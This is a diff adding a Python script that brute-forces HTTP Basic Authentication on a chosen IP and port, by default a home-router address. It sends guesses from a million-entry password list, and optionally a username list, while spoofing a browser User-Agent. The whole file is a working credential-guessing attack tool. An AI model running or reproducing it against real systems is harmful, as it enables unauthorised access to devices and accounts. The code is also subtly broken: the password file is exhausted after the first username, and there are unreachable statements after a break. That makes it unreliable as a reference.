@@ -1,0 +1,86 @@
+#!/usr/bin/env python3
+
+import requests
+import argparse
+import time 
+import signal
+
+attempt = 0
+browser_header = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
+parser = argparse.ArgumentParser(description='Parse arguments for this script')
+parser.add_argument("-t", default="192.168.0.1", type=str,help="target IP")
+parser.add_argument("-p", default="80", type=str, help="target port")
+parser.add_argument("-u", type=str, help="give username")
+parser.add_argument("-l", action="store_true", help="long bruteforce.. takes time")
+args = parser.parse_args()
+# handler for  keyboard interrupt
+def sigHandler(sigNum, sigFrame):
+    print("ctrl+c pressed.... Exiting from attack")
+    exit(0) 
+
+def brute(ip, port, browser_header, attempt, user ):
+    with open('1000000-password-seclists.txt', 'r') as fd:
+        for password in fd.readlines():
+            attempt += 1
+            passwd = password.rstrip()
+            print( "attempt: %d user: %s password: %s " %(attempt, user, passwd))
+            response = requests.get("http://"+ip+":"+port, headers= browser_header, auth=(user,passwd))
+            print(response.status_code)
+        
+            if response.status_code == 200:
+                print("[+]user: %s password: %s" %(user,password))
+                break
+                exit(0)
+                response.close()
+    
+    
+    response.close() # finally close the connection
+    
+
+# For a really rally really really long ................... Brute Force 
+def brute_long(ip, port, browser_header, attempt):
+    signal.signal(signal.SIGINT, sigHandler) # handle ctr + c     
+    with open('403395-usernames.txt','r') as unames:
+         with open('1000000-password-seclists.txt', 'r') as passwords:
+           for username in unames.readlines():
+               user = username.rstrip()
+               for password in passwords.readlines():
+                   attempt += 1
+                   passwd = password.rstrip()
+                   print( "attempt: %d user: %s password: %s " %(attempt, user, passwd))
+                   response = requests.get("http://"+ip+":"+port, headers=browser_header, auth=(user,passwd))
+                   print(response.status_code)
+                   if response.status_code == 200:
+                        print("[+]user: %s password: %s" %(user,password))
+                        break
+                        exit(0)
+                        response.close()
+         response.close() # finally close the connection ...
+
+
+
+
+if __name__ == "__main__":
+    signal.signal(signal.SIGINT, sigHandler)
+    ip = args.t
+    port = args.p
+    print("target IP:Port %s:%s " %(ip,port))
+
+    if args.l:
+        START = time.time()
+        brute_long(ip, port, browser_header, attempt)
+        END = time.time()
+        TIME = END - START
+        print("total time %d secs" %(TIME))
+    
+    if args.u:
+        user = args.u
+        START = time.time()
+        brute(ip, port, browser_header, attempt, user)
+        END = time.time()
+        TIME = END - START
+        print("total time %d secs" %TIME)
+    
+    else:
+        parser.print_help()
+
